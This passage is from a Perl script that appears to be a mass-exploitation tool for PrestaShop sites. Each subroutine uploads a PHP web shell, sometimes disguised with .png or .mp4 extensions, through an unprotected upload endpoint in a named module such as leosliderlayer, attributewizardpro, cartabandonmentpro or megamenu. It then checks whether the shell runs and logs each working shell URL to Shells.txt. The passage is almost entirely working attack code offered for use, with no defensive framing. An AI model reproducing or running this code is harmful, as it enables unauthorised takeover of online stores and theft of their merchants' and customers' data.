print color('bold white'),"leosliderlayer";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ leosliderlayer2 #####################
sub leosliderlayer2(){
my $url = "$site/modules/leosliderlayer/upload_images.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/leosliderlayer/slides/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"leosliderlayer2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"leosliderlayer2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
############### vtemskitter #####################
sub vtemskitter(){
my $url = "$site/modules/vtemskitter/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/vtemskitter/img/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"vtemskitter";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"vtemskitter";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
############### additionalproductstabs #####################
sub additionalproductstabs(){
my $url = "$site/modules/additionalproductstabs/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/additionalproductstabs/file_uploads/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"additionalproductstabs";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"additionalproductstabs";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
############### addthisplugin #####################
sub addthisplugin(){
my $url = "$site/modules/addthisplugin/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$jro_homepageadvertiseup="$site/modules/addthisplugin/file_uploads/priv.php?c=izo";

my $checkjro_homepageadvertise = $ua->get("$jro_homepageadvertiseup")->content;
if($checkjro_homepageadvertise =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"addthisplugin";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $jro_homepageadvertiseup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$jro_homepageadvertiseup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"addthisplugin";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ attributewizardpro #####################
sub attributewizardpro(){
my $url = "$site/modules/attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$attributewizardproup="$site/modules/attributewizardpro/file_uploads/priv.php?c=izo";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

############### attributewizardprox #####################
sub attributewizardprox(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$attributewizardproup="$site/modules/attributewizardpro.OLD/file_uploads/priv.php?c=izo";

my $checkattributewizardpro = $ua->get("$attributewizardproup")->content;
if($checkattributewizardpro =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $attributewizardproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$attributewizardproup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ 1attributewizardpro #####################
sub oneattributewizardpro(){
my $url = "$site/modules/1attributewizardpro/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/priv.php?c=izo";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $oneattributewizardproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/priv.php?c=izo";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $attributewizardproOLDup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["tool/priv.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/priv.php?c=izo";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $attributewizardpro_xup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/priv.php.png?c=izo";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $advancedsliderup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["tool/priv.php"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/priv.php?c=izo";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $cartabandonmentproup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["tool/priv.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/priv.php.png?c=izo";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/izocin/) {
  
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $cartabandonmentproOldup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["tool/priv.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/priv.php.mp4?c=izo";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"videostab";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $videostabup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$videostabup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"videostab";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["tool/priv.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/priv.php?c=izo";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $wg24themeadministrationup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="tool/priv.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/priv.php?c=izo";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ orderfiles #####################
sub orderfiles(){
my $url = "$site/modules/orderfiles/ajax/upload.php";
my $shell ="tool/priv.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$fieldvmegamenuup="$site/modules/orderfiles/files/priv.php?c=izo";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"orderfiles";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"orderfiles";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["tool/priv.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/priv.php?c=izo";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $wdoptionpanelup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="tool/priv.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/priv.php?c=izo";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}
################ pk_flexmenu #####################
sub pk_flexmenu2(){
my $url = "$site/modules/pk_flexmenu_old/ajax/upload.php";
my $shell ="tool/priv.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_flexmenuup="$site/modules/pk_flexmenu_old/uploads/priv.php?c=izo";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu2";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu2";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="tool/priv.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/priv.php?c=izo";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $pk_vertflexmenuup\n";

open (TEXT, '>>Shells.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="tool/nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?c=izo";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $nvn_export_ordersup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=priv.php";
my $shell ="tool/priv.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );
$megamenuup="$site/priv.php.png?c=izo";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $megamenuup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$megamenuup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," ---> ";
print color('bold red'),"Failed\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="tool/priv.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]
           
            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/priv.php?c=izo";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/izocin/) {

print color('bold red'),"[";
print color('bold green'),"PrestaShoP";
print color('bold red'),"]==> ";
print color('bold red'),"[";
print color('bold cyan'),"$site";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," ---> ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"$site";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold BRIGHT_MAGENTA'),"  [Link] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Shells.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
threads->exit();
}else{
print color('bold red'),"[";
